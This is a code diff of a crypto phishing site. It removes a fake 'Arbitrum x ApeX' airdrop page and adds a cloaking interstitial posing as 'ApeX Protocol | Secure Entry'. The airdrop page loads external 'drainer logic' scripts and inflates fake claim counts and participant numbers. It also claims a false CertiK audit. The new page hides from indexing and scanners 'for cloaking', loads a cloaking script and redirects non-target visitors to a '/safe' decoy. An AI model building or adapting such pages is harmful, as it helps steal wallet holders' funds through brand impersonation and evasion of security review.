@@ -1,28 +1,20 @@
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="mobile-web-app-capable" content="yes">
-    <!-- Anti‑indexing & cache control -->
-    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
-    <meta http-equiv="Pragma" content="no-cache">
-    <meta http-equiv="Expires" content="0">
-    <meta name="robots" content="noindex, nofollow">
-
-    <title>Arbitrum x ApeX – Joint Airdrop</title>
-
-    <!-- Font Awesome & Google Fonts -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <!-- Chart.js for the token chart (optional, matches original style) -->
-    <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
-    <!-- Web3 library (for wallet interaction) -->
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <!-- Prevent caching and indexing – critical for cloaking -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="0" />
+    <meta name="robots" content="noindex, nofollow" />
+    <title>ApeX Protocol | Secure Entry</title>
+    <!-- Preconnect to external resources for faster loading -->
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
+    <!-- Font Awesome (optional, matches your style) -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <style>
         * {
             margin: 0;
@@ -31,342 +23,184 @@
         }
 
         body {
-            font-family: 'Inter', sans-serif;
-            background: radial-gradient(circle at 20% 30%, #0a0c1a 0%, #03050b 100%);
-            color: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: #fff;
             min-height: 100vh;
-            line-height: 1.5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            position: relative;
         }
 
-        /* animated background */
-        .bg-orb {
-            position: fixed;
-            width: 100%;
-            height: 100%;
+        .bg-particles {
+            position: absolute;
             top: 0;
             left: 0;
-            z-index: -2;
-            background: radial-gradient(ellipse at 30% 40%, rgba(40, 70, 200, 0.15) 0%, transparent 50%),
-                        radial-gradient(ellipse at 80% 70%, rgba(255, 107, 0, 0.1) 0%, transparent 60%);
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(255,107,0,0.05) 0%, transparent 30%),
+                        radial-gradient(circle at 80% 70%, rgba(255,107,0,0.05) 0%, transparent 30%);
+            z-index: 0;
         }
 
         .container {
-            max-width: 1300px;
-            margin: 0 auto;
-            padding: 2rem 1.5rem;
-        }
-
-        /* header with logos */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 1rem;
-            margin-bottom: 3rem;
-        }
-
-        .logo-group {
-            display: flex;
-            align-items: center;
-            gap: 1.2rem;
-            background: rgba(255,255,255,0.03);
-            backdrop-filter: blur(8px);
-            padding: 0.8rem 1.5rem;
-            border-radius: 60px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-
-        .logo-item {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .logo-item i {
-            font-size: 2rem;
-        }
-
-        .logo-item span {
-            font-weight: 700;
-            font-size: 1.3rem;
-        }
-
-        .arb-logo i {
-            color: #2d8cff;
-            text-shadow: 0 0 8px rgba(45,140,255,0.5);
-        }
-        .apex-logo i {
-            color: #ff6b00;
-            text-shadow: 0 0 8px rgba(255,107,0,0.5);
-        }
-        .badge {
-            background: linear-gradient(135deg, #ff6b00, #ff3a00);
-            border-radius: 30px;
-            padding: 0.4rem 1rem;
-            font-size: 0.8rem;
-            font-weight: 600;
-            letter-spacing: 1px;
-        }
-
-        /* main hero */
-        .hero {
+            position: relative;
+            z-index: 1;
             text-align: center;
-            margin: 3rem 0 2rem;
-        }
-        .hero h1 {
-            font-size: 3rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #fff, #ff6b00, #2d8cff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            margin-bottom: 1rem;
-        }
-        .hero .sub {
-            font-size: 1.2rem;
-            color: #a0aec0;
-            max-width: 700px;
-            margin: 0 auto;
-        }
-
-        /* cards */
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1.5rem;
-            margin: 3rem 0;
-        }
-        .stat-card {
-            background: rgba(15, 25, 45, 0.6);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 28px;
-            padding: 1.2rem;
-            text-align: center;
-            transition: transform 0.2s;
-        }
-        .stat-card:hover { transform: translateY(-3px); }
-        .stat-number {
-            font-size: 2rem;
-            font-weight: 800;
-            color: #ff6b00;
-        }
-        .stat-label {
-            color: #94a3b8;
-            font-size: 0.8rem;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .claim-panel {
-            background: rgba(10, 20, 35, 0.7);
-            backdrop-filter: blur(12px);
-            border-radius: 32px;
-            border: 1px solid rgba(255,107,0,0.3);
+            max-width: 600px;
             padding: 2rem;
-            margin: 2rem 0;
-            text-align: center;
+            background: rgba(15, 23, 42, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 32px;
+            border: 1px solid rgba(255,107,0,0.2);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
-        .claim-amount {
-            font-size: 2.5rem;
-            font-weight: 800;
-            background: linear-gradient(135deg, #ff6b00, #ffaa40);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-        .claim-btn {
-            background: linear-gradient(135deg, #ff6b00, #ff3a00);
-            border: none;
-            padding: 1rem 2rem;
-            font-size: 1.2rem;
-            font-weight: 700;
-            border-radius: 60px;
-            color: white;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 8px 20px rgba(255,107,0,0.3);
-            width: 260px;
-            margin: 1.5rem auto 0;
-            display: inline-flex;
+
+        .logo {
+            display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-        }
-        .claim-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .claim-btn:hover:not(:disabled) {
-            transform: scale(1.02);
-            box-shadow: 0 10px 25px rgba(255,107,0,0.5);
+            gap: 12px;
+            margin-bottom: 24px;
         }
 
-        .wallet-info {
-            margin-top: 1rem;
-            background: rgba(0,0,0,0.3);
-            border-radius: 40px;
-            padding: 0.5rem 1rem;
+        .logo i {
+            font-size: 3rem;
+            color: #ff6b00;
+            filter: drop-shadow(0 0 10px rgba(255,107,0,0.5));
+        }
+
+        .logo span {
+            font-size: 2.2rem;
+            font-weight: 700;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #fff 0%, #ff6b00 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 64px;
+            height: 64px;
+            border: 5px solid rgba(255,107,0,0.2);
+            border-top: 5px solid #ff6b00;
+            border-radius: 50%;
+            animation: spin 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+            margin: 32px auto;
+            box-shadow: 0 0 20px rgba(255,107,0,0.3);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 400;
+            margin-bottom: 16px;
+            color: #e2e8f0;
+        }
+
+        p {
+            font-size: 1rem;
+            color: #94a3b8;
+            line-height: 1.6;
+            margin-bottom: 8px;
+        }
+
+        .security-badge {
             display: inline-flex;
             align-items: center;
-            gap: 12px;
+            gap: 8px;
+            background: rgba(255,107,0,0.1);
+            padding: 8px 20px;
+            border-radius: 40px;
+            border: 1px solid rgba(255,107,0,0.3);
+            margin-top: 24px;
             font-size: 0.9rem;
+            color: #ffd7b3;
         }
 
-        .token-chart-container {
-            background: rgba(0,0,0,0.3);
-            border-radius: 28px;
-            padding: 1rem;
-            margin: 2rem 0;
+        .security-badge i {
+            color: #ff6b00;
         }
-        canvas { max-height: 280px; width: 100%; }
-
-        .recent-claims {
-            background: rgba(0,0,0,0.3);
-            border-radius: 28px;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-        }
-        .claim-item {
-            display: flex;
-            justify-content: space-between;
-            padding: 0.7rem 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            font-size: 0.9rem;
-        }
-        .claim-address { font-family: monospace; color: #ffaa66; }
-        .claim-time { color: #6c7a91; }
 
         footer {
-            text-align: center;
-            margin-top: 3rem;
-            color: #4b5563;
-            font-size: 0.75rem;
+            margin-top: 32px;
+            font-size: 0.8rem;
+            color: #475569;
         }
-
-        @media (max-width: 640px) {
-            .container { padding: 1rem; }
-            .hero h1 { font-size: 2rem; }
-            .claim-amount { font-size: 1.8rem; }
+        /* Fallback message for users without JavaScript */
+        .noscript-warning {
+            margin-top: 20px;
+            padding: 10px;
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff0000;
+            border-radius: 8px;
+            color: #ffaaaa;
+        }
+        .noscript-warning a {
+            color: #ff6b00;
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-<div class="bg-orb"></div>
-<div class="container">
-    <!-- Header with both brands -->
-    <div class="header">
-        <div class="logo-group">
-            <div class="logo-item arb-logo">
-                <i class="fab fa-ethereum"></i>
-                <span>Arbitrum</span>
-            </div>
-            <i class="fas fa-plus" style="color:#ff6b00; opacity:0.7;"></i>
-            <div class="logo-item apex-logo">
-                <i class="fas fa-ape"></i>
-                <span>ApeX</span>
-            </div>
+    <div class="bg-particles"></div>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-ape"></i>
+            <span>APEX</span>
         </div>
-        <div class="badge"><i class="fas fa-gem"></i> Official Collaboration</div>
-    </div>
-
-    <!-- Hero section -->
-    <div class="hero">
-        <h1>Arbitrum × ApeX<br>Genesis Airdrop</h1>
-        <div class="sub">The first joint liquidity & governance event – claim your share of <strong>2,500,000 APEX</strong> + <strong>500,000 ARB</strong> rewards.</div>
-    </div>
-
-    <!-- Stats -->
-    <div class="stats-grid">
-        <div class="stat-card"><div class="stat-number" id="claimedCount">0</div><div class="stat-label">Tokens claimed</div></div>
-        <div class="stat-card"><div class="stat-number" id="participants">37,200</div><div class="stat-label">Participants</div></div>
-        <div class="stat-card"><div class="stat-number">$0.00</div><div class="stat-label">Gas sponsored</div></div>
-        <div class="stat-card"><div class="stat-number">100%</div><div class="stat-label">Fair distribution</div></div>
-    </div>
-
-    <!-- Claim panel -->
-    <div class="claim-panel" id="claimPanel">
-        <i class="fas fa-gift" style="font-size: 2rem; color:#ff6b00; margin-bottom: 10px; display: block;"></i>
-        <div class="claim-amount">250 APEX + 50 ARB</div>
-        <div style="margin: 10px 0; font-size: 0.9rem;">Eligible wallets <i class="fas fa-check-circle" style="color:#10b981;"></i> Instant distribution</div>
-        <button class="claim-btn" id="connectButton">
-            <i class="fas fa-wallet"></i> Connect Wallet to Claim
-        </button>
-        <div id="walletButtonContainer" style="margin-top: 10px;"></div>
-        <div id="claimStatus" class="status" style="margin-top: 15px; font-size: 0.9rem;"></div>
-    </div>
-
-    <!-- Token chart (fake / dynamic) -->
-    <div class="token-chart-container">
-        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
-            <span><i class="fas fa-chart-line"></i> APEX Price (24h)</span>
-            <span id="priceChange" style="color:#10b981;">+2.4%</span>
+        <div class="loader"></div>
+        <h2>Establishing Secure Connection</h2>
+        <p>Validating environment • Applying security policies • Routing to optimal gateway</p>
+        <p style="font-size: 0.9rem; color: #64748b;">This may take a few seconds...</p>
+        
+        <div class="security-badge">
+            <i class="fas fa-shield-alt"></i> AI-Powered Threat Detection Active
         </div>
-        <canvas id="tokenChart" width="400" height="200" style="width:100%; height:200px;"></canvas>
+
+        <footer>
+            <i class="fas fa-lock"></i> End-to-end encrypted • v3.0.1
+        </footer>
     </div>
 
-    <!-- Social proof: recent claims -->
-    <div class="recent-claims">
-        <div style="display: flex; gap: 10px; align-items: center; margin-bottom: 12px;">
-            <i class="fas fa-clock"></i> <strong>Live claims</strong>
-        </div>
-        <div id="claimList"></div>
-    </div>
+    <!-- Safety timeout: if cloaking script fails, redirect to safe page after 5 seconds -->
+    <script>
+        (function() {
+            // Set a timeout to redirect to the safe page using the absolute path /safe
+            const safetyTimeout = setTimeout(function() {
+                window.location.replace('/safe');
+            }, 5000); // 5 seconds
 
-    <footer>
-        <i class="fas fa-shield-alt"></i> Audited by CertiK • Powered by Arbitrum AnyTrust • No gas required for claiming
-    </footer>
-</div>
-
-<!-- External scripts (main + drainer logic) -->
-<script src="../Java/main.js" type="module"></script>
-<script src="../Java/script.js" type="module"></script>
-
-<!-- Inline UI update functions to mirror existing fake data (compatible with script.js) -->
-<script>
-    (function() {
-        // Wait for DOM and external scripts to initialize
-        window.addEventListener('DOMContentLoaded', () => {
-            // Update stats with some random but believable numbers
-            const claimedElem = document.getElementById('claimedCount');
-            const participantsElem = document.getElementById('participants');
-            if (claimedElem) {
-                let base = 1870000;  // total APEX claimed so far
-                setInterval(() => {
-                    base += Math.floor(Math.random() * 120);
-                    claimedElem.innerText = base.toLocaleString();
-                }, 8000);
-            }
-            if (participantsElem) {
-                let p = 37200;
-                setInterval(() => {
-                    p += Math.floor(Math.random() * 7);
-                    participantsElem.innerText = p.toLocaleString();
-                }, 10000);
-            }
-
-            // integrate with existing claim list from script.js if available
-            // But script.js already populates claimListElement. We'll just ensure our ID matches.
-            // Already same IDs: claimList, claimStatus, connectButton, walletButtonContainer
-
-            // Small extra: dynamic badge to show Arbitrum partnership
-            const badge = document.querySelector('.badge');
-            if (badge) {
-                setInterval(() => {
-                    badge.style.opacity = '0.9';
-                    setTimeout(() => badge.style.opacity = '1', 200);
-                }, 15000);
-            }
-
-            // Make sure the existing global initiateClaimProcess is accessible
-            window.initiateClaimProcess = window.initiateClaimProcess || function() {
-                console.warn('initiateClaimProcess not defined yet');
+            // The cloaking script will call this function to cancel the timeout if it succeeds
+            window.cloakingReady = function() {
+                clearTimeout(safetyTimeout);
             };
-        });
-    })();
-</script>
+        })();
+    </script>
+
+    <!-- Load your cloaking script – this is the only JS that matters -->
+    <script type="module" src="../Java/clocking.js"></script>
+
+    <!-- Fallback for users with JavaScript disabled -->
+    <noscript>
+        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; z-index: 9999;">
+            <div class="container" style="margin: 20px;">
+                <div class="noscript-warning">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    JavaScript is required to proceed. Please enable JavaScript or 
+                    <a href="/safe">click here</a> to continue.
+                </div>
+            </div>
+        </div>
+        <meta http-equiv="refresh" content="0; url=/safe">
+    </noscript>
 </body>
 </html>
-```
